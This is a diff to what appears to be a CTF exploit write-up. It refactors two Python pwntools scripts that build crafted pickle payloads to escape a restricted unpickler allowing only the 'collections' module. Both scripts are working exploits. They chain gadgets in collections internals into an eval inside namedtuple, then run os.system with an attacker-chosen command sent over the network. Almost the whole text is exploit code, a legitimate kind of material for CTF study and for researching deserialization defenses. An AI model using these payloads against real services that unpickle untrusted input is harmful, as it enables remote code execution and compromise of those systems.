@@ -75,44 +75,43 @@ Attack script:
 ```python
 #!/usr/bin/env python3
 from pwn import *
-import struct
+import pickle, struct
 
 context.log_level = 'error'
 HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
 CMD = sys.argv[3] if len(sys.argv) > 3 else 'cat /home/ctf/flag'
 
-def p32(x): return struct.pack('<I', x)
 def short_binunicode(s):
     data = s.encode('utf-8'); assert len(data) < 256
-    return b'\x8c' + bytes([len(data)]) + data
-def stack_global(m, n): return short_binunicode(m) + short_binunicode(n) + b'\x93'
+    return pickle.SHORT_BINUNICODE + bytes([len(data)]) + data
+def stack_global(m, n): return short_binunicode(m) + short_binunicode(n) + pickle.STACK_GLOBAL
 
 p = b''
 # setattr(UserDict, "__radd__", _chain) via BUILD slotstate
-p += stack_global('collections', 'UserDict') + b'(\x4e\x7d'
+p += stack_global('collections', 'UserDict') + pickle.MARK + pickle.NONE + pickle.EMPTY_DICT
 p += short_binunicode('__radd__') + stack_global('collections', '_chain')
-p += b'\x73\x74\x62\x30'
+p += pickle.SETITEM + pickle.TUPLE + pickle.BUILD + pickle.POP
 # Modify _collections_abc.__all__ via BUILD, set map/list for __getattr__
-p += stack_global('collections', '_collections_abc') + b'(\x7d'
-p += short_binunicode('__all__') + b'\x5d'
-p += short_binunicode('map'); p += b'\x61'
-p += short_binunicode('list'); p += b'\x61'
-p += b'\x73'
-p += short_binunicode('map') + stack_global('collections', 'defaultdict') + b'\x73'
-p += short_binunicode('list') + stack_global('collections', 'UserDict') + b'\x73'
-p += b'\x7d\x74\x62\x30'
+p += stack_global('collections', '_collections_abc') + pickle.MARK + pickle.EMPTY_DICT
+p += short_binunicode('__all__') + pickle.EMPTY_LIST
+p += short_binunicode('map'); p += pickle.APPEND
+p += short_binunicode('list'); p += pickle.APPEND
+p += pickle.SETITEM
+p += short_binunicode('map') + stack_global('collections', 'defaultdict') + pickle.SETITEM
+p += short_binunicode('list') + stack_global('collections', 'UserDict') + pickle.SETITEM
+p += pickle.EMPTY_DICT + pickle.TUPLE + pickle.BUILD + pickle.POP
 # Trigger __getattr__ to inject map/list into collections globals
-p += stack_global('collections', 'map'); p += b'\x30'
-p += stack_global('collections', 'list'); p += b'\x30'
+p += stack_global('collections', 'map'); p += pickle.POP
+p += stack_global('collections', 'list'); p += pickle.POP
 # namedtuple("a", {payload: 0}) → eval triggers RCE
 payload = f"a = ().__class__.__base__.__subclasses__()[84]().load_module('os').system('{CMD}'): 1 #"
-p += stack_global('collections', 'namedtuple') + b'(\x8c\x01a\x7d'
-p += b'X' + p32(len(payload)) + payload.encode()
-p += b'J\x00\x00\x00\x00\x73\x74\x52\x2e'
+p += stack_global('collections', 'namedtuple') + pickle.MARK + short_binunicode('a') + pickle.EMPTY_DICT
+p += pickle.BINUNICODE + struct.pack('<I', len(payload)) + payload.encode()
+p += pickle.BININT + struct.pack('<i', 0) + pickle.SETITEM + pickle.TUPLE + pickle.REDUCE + pickle.STOP
 
 r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
-r.sendline((b'\x80\x04' + p).hex().encode())
+r.sendline((pickle.PROTO + b'\x04' + p).hex().encode())
 print(r.recvall(timeout=3).decode(errors='replace'))
 ```
 
@@ -142,26 +141,28 @@ Attack script:
 ```python
 #!/usr/bin/env python3
 from pwn import *
-import struct
+import pickle, struct
 
 context.log_level = 'error'
 HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
 CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'
 
+P = pickle  # shorthand
+
 class PickleBuilder:
     def __init__(self):
-        self.p = b'\x80\x04'; self.memos = {}; self.next_memo = 0
+        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
     def short_binunicode(self, s):
         data = s.encode('utf-8'); assert len(data) < 256
-        return b'\x8c' + bytes([len(data)]) + data
+        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
     def stack_global(self, m, n):
-        return self.short_binunicode(m) + self.short_binunicode(n) + b'\x93'
+        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
     def memoize(self):
         idx = self.next_memo; self.next_memo += 1
-        return b'\x94', idx
+        return P.MEMOIZE, idx
     def binget(self, idx):
-        return b'h' + bytes([idx]) if idx < 256 else b'j' + struct.pack('<I', idx)
+        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
     def emit_global(self, m, n, save_as=None):
         b = self.stack_global(m, n)
         if save_as is not None:
@@ -169,28 +170,29 @@ class PickleBuilder:
         self.p += b
     def get_memo(self, k): return self.binget(self.memos[k])
     def build_slotstate(self, obj, key, value):
-        return obj + b'}\x28' + key + value + b'd\x86\x62'
+        return obj + P.EMPTY_DICT + P.MARK + key + value + P.DICT + P.TUPLE2 + P.BUILD
     def emit_build_slotstate(self, obj, k, v): self.p += self.build_slotstate(obj, k, v)
     def emit_str(self, s, save_as=None):
         b = self.short_binunicode(s)
         if save_as is not None:
             mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
         self.p += b
-    def empty_tuple(self): return b')'
-    def tuple1(self): return b'\x85'
-    def tuple2(self): return b'\x86'
-    def reduce(self): return b'R'
-    def mark(self): return b'('
-    def list_op(self): return b'l'
-    def none(self): return b'N'
-    def stop(self): return b'.'
+    def empty_tuple(self): return P.EMPTY_TUPLE
+    def tuple1(self): return P.TUPLE1
+    def tuple2(self): return P.TUPLE2
+    def reduce(self): return P.REDUCE
+    def mark(self): return P.MARK
+    def list_op(self): return P.LIST
+    def none(self): return P.NONE
+    def stop(self): return P.STOP
 
 def build_exploit():
     pb = PickleBuilder()
-    for name in ['namedtuple', 'namedtuple']:
-        pb.emit_global('collections', name, save_as=name)
-    for name in ['_collections_abc', '_sys', 'Counter', 'UserString']:
-        pb.emit_global('collections', name, save_as=name)
+    pb.emit_global('collections', 'namedtuple', save_as='namedtuple')
+    pb.emit_global('collections', '_collections_abc', save_as='_collections_abc')
+    pb.emit_global('collections', '_sys', save_as='_sys')
+    pb.emit_global('collections', 'Counter', save_as='Counter')
+    pb.emit_global('collections', 'UserString', save_as='UserString')
 
     pb.p += pb.mark()
     for n in ['_check_methods', '_type_repr', 'abstractmethod', 'map', 'tuple', 'str']:
@@ -212,16 +214,13 @@ def build_exploit():
     pb.emit_build_slotstate(pb.binget(us2), pb.short_binunicode('__mro__'),
                             pb.binget(pb.next_memo - 1))
 
-    # Counter() instances
+    # Counter() instances (C1 = NotImplemented, C2 = field_names)
     pb.p += pb.get_memo('Counter') + pb.empty_tuple() + pb.reduce() + pb.memoize()[0]
     c1 = pb.next_memo - 1
     pb.p += pb.binget(c1) + pb.memoize()[0]
     c2 = pb.next_memo - 1
 
-    for src_key, target, attr in [
-        ('_check_methods', 'UserString', 'replace'),
-        ('_check_methods', c2, 'split'),
-    ]:
+    for target, attr in [('UserString', 'replace'), (c2, 'split')]:
         pb.p += pb.get_memo('_check_methods') + pb.memoize()[0]
         obj = pb.get_memo(target) if isinstance(target, str) else pb.binget(target)
         pb.emit_build_slotstate(obj, pb.short_binunicode(attr), pb.binget(pb.next_memo - 1))
